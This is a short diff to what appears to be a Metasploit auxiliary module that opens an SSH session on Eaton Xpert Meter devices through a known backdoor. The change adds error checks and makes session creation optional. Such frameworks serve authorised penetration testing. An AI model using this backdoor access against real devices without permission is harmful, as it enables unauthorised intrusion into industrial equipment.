@@ -87,13 +87,23 @@ class MetasploitModule < Msf::Auxiliary
 
     shell = Net::SSH::CommandStream.new(ssh)
 
-    return unless shell
+    # XXX: Wait for CommandStream to log a channel request failure
+    sleep 0.1
+
+    if (e = shell.error)
+      print_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
+      return
+    end
+
+    info = "#{self.name} (#{version})"
 
     ds_merge = {
       'USERNAME' => 'admin'
     }
 
-    start_session(self, "Eaton Xpert Meter SSH Backdoor (#{version})", ds_merge, false, shell.lsock)
+    if datastore['CreateSession']
+      start_session(self, info, ds_merge, false, shell.lsock)
+    end
 
     # XXX: Ruby segfaults if we don't remove the SSH socket
     remove_socket(ssh.transport.socket)
